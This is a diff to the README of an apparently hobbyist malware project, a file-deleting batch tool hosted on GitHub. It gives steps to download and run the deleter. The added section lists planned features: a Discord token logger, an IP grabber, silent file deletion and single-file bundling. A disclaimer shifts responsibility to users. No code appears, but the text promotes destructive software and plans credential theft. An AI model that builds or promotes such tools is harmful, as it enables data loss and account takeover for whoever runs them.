@@ -19,5 +19,13 @@ You probably can't trick anyone into using this since it's quite obvious but it'
 1. Download the latest version in https://github.com/qazwsx-11/c-drive-deleter/releases/
 2. Extract the files onto a your downloads folder, run the file called *! Start.bat*, press a key to start deleting files.
 
+## Things to add in the future
+
+* Discord Token Logger - Doing
+* IP grabber - Not started yet
+* Silent file deleting - Doing
+* Compile all files into a single file - I have no idea how
+
+
 
 Disclaimer: **I am not responsible for any damage done to your computer if you choose to run this, if you want to test it, I recommend doing it on a Virtual Machine.**
